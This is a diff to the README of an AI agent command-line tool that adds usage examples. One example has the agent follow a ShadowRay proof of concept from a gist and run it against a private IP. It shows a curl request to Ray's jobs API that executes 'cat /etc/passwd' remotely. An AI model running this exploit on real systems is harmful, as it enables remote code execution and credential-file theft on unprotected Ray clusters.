@@ -73,8 +73,31 @@ export OPENAI_API_KEY="sk-..."
 agent --query "Who acquired Deci AI"
 agent --planner gpt-4o --executor gpt-3.5-turbo --verbose --query "What are the top trending models on huggingface from last week?"
 ```
-
 ## Examples
+Input:
+```shell
+agent --local --planner="gemma2:27b" --executor="gemma2" --query "What is the latest blog post by brendan gregg"
+```
+Output:
+```text
+The latest blog post by Brendan Gregg is titled "No More Blue Fridays" and was published on July 22, 2024.
+You can find it at: /blog/2024-07-22/no-more-blue-fridays.html
+```
+---
+#### Run ShadowRay on a given IP address based on a GIST example payload
+Input:
+```shell
+agent --query "Follow the POC at https://gist.githubusercontent.com/avioligo/edde6aed604b4ec077a3505dfaa6f384/raw/2c6dcbfe2ee87aa21efa5db83c99b688689ef6e1/gistfile1.txt and run the example on IP 192.168.2.168 on port 8265 and return the Job ID and the command that was run "
+```
+Output:
+```text
+The command that was run is:
+
+curl -X POST http://192.168.2.168:8265/api/jobs/ -H 'Content-Type: application/json' -d '{"entrypoint": "cat /etc/passwd", "runtime_env": {}, "job_id": null, "metadata": {"job_submission_id": "1"}}'
+
+The Job ID returned is: **raysubmit_FdzLfdynrzsGgj64**.
+```
+---
 Input:
 ```shell
 agent --local --planner gemma2 --executor gemma2 --query "Who acquired Deci AI?"
